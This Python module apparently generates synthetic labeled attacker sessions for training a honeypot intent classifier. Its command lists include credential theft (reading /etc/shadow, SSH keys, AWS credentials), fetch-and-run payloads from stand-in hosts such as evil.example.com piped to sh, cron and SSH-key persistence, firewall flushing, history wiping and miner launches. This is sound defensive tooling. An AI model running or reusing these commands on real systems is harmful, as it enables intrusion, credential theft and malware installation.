"""Labeled synthetic attacker sessions for training/validating the classifier.

Real graduation labs accumulate labeled Cowrie sessions slowly; to bootstrap the
Week-3 classifier (and to keep the unit tests deterministic and dependency-light)
we generate realistic command sequences per intent class. Each generator mixes a
characteristic "core" of commands with light randomisation (noise, recon padding,
variable counts) so the classes are separable but not trivially memorisable.
"""
from __future__ import annotations

import random
from typing import List, Tuple

from .features import Session
from .classifier import INTENTS

# Common recon noise that shows up across many real intrusions.
_RECON_NOISE = [
    "uname -a", "whoami", "id", "cat /proc/cpuinfo", "ls -la", "cd /tmp",
    "free -m", "df -h", "hostname", "w", "cat /etc/issue",
]


def _maybe(rng: random.Random, items: List[str], k_min: int, k_max: int) -> List[str]:
    k = rng.randint(k_min, k_max)
    return [rng.choice(items) for _ in range(k)]


def _recon(rng):
    cmds = rng.sample(_RECON_NOISE, k=rng.randint(4, 8))
    cmds += _maybe(rng, ["cat /etc/passwd", "ls /home", "ls -la /root", "netstat -antp",
                         "ps aux", "find / -perm -4000 2>/dev/null"], 1, 3)
    return Session(session_id="s", commands=cmds, login_attempts=rng.randint(1, 3),
                   login_success=True, duration_s=rng.uniform(20, 120))


def _credential_harvest(rng):
    cmds = _maybe(rng, _RECON_NOISE, 0, 2) + [
        "cat /etc/shadow", "cat /etc/passwd",
        rng.choice(["cat ~/.ssh/id_rsa", "cat /root/.ssh/id_rsa", "find / -name id_rsa"]),
        rng.choice(["cat ~/.aws/credentials", "cat /home/*/.aws/credentials"]),
        rng.choice(["grep -ri password /var/www", "cat /var/www/html/wp-config.php"]),
        rng.choice(["cat .env", "find / -name '.env' 2>/dev/null"]),
    ]
    cmds += _maybe(rng, ["cat ~/.mysql_history", "cat ~/.bash_history"], 0, 2)
    return Session(session_id="s", commands=cmds, login_attempts=rng.randint(1, 4),
                   login_success=True, duration_s=rng.uniform(40, 200))


def _malware_deploy(rng):
    host = rng.choice(["185.220.101.5", "evil.example.com", "45.83.122.9"])
    binname = rng.choice(["x86", "bins.sh", "update", "kworker"])
    cmds = _maybe(rng, _RECON_NOISE, 0, 2) + [
        rng.choice([f"wget http://{host}/{binname}", f"curl -O http://{host}/{binname}",
                    f"wget http://{host}/{binname} -O /tmp/{binname}"]),
        f"chmod 777 /tmp/{binname}",
        rng.choice([f"./{binname}", f"/tmp/{binname}", f"sh /tmp/{binname}"]),
    ]
    if rng.random() < 0.5:
        cmds.append(f"curl http://{host}/install.sh | sh")
    cmds += _maybe(rng, ["rm -rf /tmp/*", "history -c"], 0, 2)
    dls = [f"http://{host}/{binname}"]
    return Session(session_id="s", commands=cmds, login_attempts=rng.randint(1, 5),
                   login_success=True, downloads=dls, duration_s=rng.uniform(15, 90))


def _lateral_movement(rng):
    targets = [f"10.0.0.{rng.randint(2,254)}" for _ in range(rng.randint(2, 5))]
    cmds = _maybe(rng, _RECON_NOISE, 0, 2) + [
        "cat ~/.ssh/known_hosts", "cat /etc/hosts", "arp -a",
    ]
    for t in targets:
        cmds.append(rng.choice([f"ssh root@{t}", f"ssh admin@{t} 'id'",
                                f"scp payload root@{t}:/tmp/"]))
    cmds += _maybe(rng, ["nmap -sn 10.0.0.0/24", "for i in $(seq 1 254); do ping -c1 10.0.0.$i; done"], 0, 2)
    tcp = [f"{t}:22" for t in targets]
    return Session(session_id="s", commands=cmds, login_attempts=rng.randint(1, 3),
                   login_success=True, tcpip_requests=tcp, duration_s=rng.uniform(60, 300))


def _cryptomining(rng):
    pool = rng.choice(["pool.minexmr.com:4444", "xmr.nanopool.org:14444"])
    cmds = _maybe(rng, ["nproc", "lscpu", "cat /proc/cpuinfo", "free -m"], 2, 4) + [
        rng.choice(["wget http://x.x/xmrig.tar.gz", "curl -O http://x.x/cpuminer"]),
        "tar xf xmrig.tar.gz",
        "chmod +x xmrig",
        rng.choice([f"./xmrig -o {pool} -u WALLET", f"./minerd -a cryptonight -o stratum+tcp://{pool}"]),
    ]
    dls = ["http://x.x/xmrig.tar.gz"]
    return Session(session_id="s", commands=cmds, login_attempts=rng.randint(1, 3),
                   login_success=True, downloads=dls, duration_s=rng.uniform(30, 180))


def _bot_enrollment(rng):
    host = rng.choice(["192.99.142.235", "c2.botnet.su"])
    cmds = [
        rng.choice(["wget http://%s/bot" % host, "tftp -g -r bot %s" % host,
                    "busybox wget http://%s/bot -O bot" % host]),
        "chmod +x bot",
        "./bot",
        rng.choice(["crontab -l", "echo '* * * * * /tmp/bot' | crontab -",
                    "echo /tmp/bot >> /etc/rc.local"]),
        rng.choice(["echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys",
                    "iptables -F"]),
    ]
    # bots fire many quick repetitive commands -> short duration, high cps
    cmds += [rng.choice(["busybox", "echo -e", "cat /bin/echo"]) for _ in range(rng.randint(3, 8))]
    dls = ["http://%s/bot" % host]
    return Session(session_id="s", commands=cmds, login_attempts=rng.randint(1, 6),
                   login_success=True, downloads=dls, duration_s=rng.uniform(2, 15))


_GENERATORS = {
    "Reconnaissance": _recon,
    "Credential Harvesting": _credential_harvest,
    "Malware Deployment": _malware_deploy,
    "Lateral Movement": _lateral_movement,
    "Cryptomining": _cryptomining,
    "Bot Enrollment": _bot_enrollment,
}
assert set(_GENERATORS) == set(INTENTS), "synthetic generators must cover all INTENTS"


def synthetic_sessions(n_per_class: int = 80, seed: int = 1337) -> Tuple[List[Session], List[str]]:
    """Return ``(sessions, labels)`` with ``n_per_class`` examples per intent."""
    rng = random.Random(seed)
    sessions: List[Session] = []
    labels: List[str] = []
    for intent in INTENTS:
        gen = _GENERATORS[intent]
        for i in range(n_per_class):
            s = gen(rng)
            s.session_id = f"{intent[:4].lower()}-{i}"
            s.src_ip = f"203.0.113.{rng.randint(1, 254)}"
            sessions.append(s)
            labels.append(intent)
    return sessions, labels
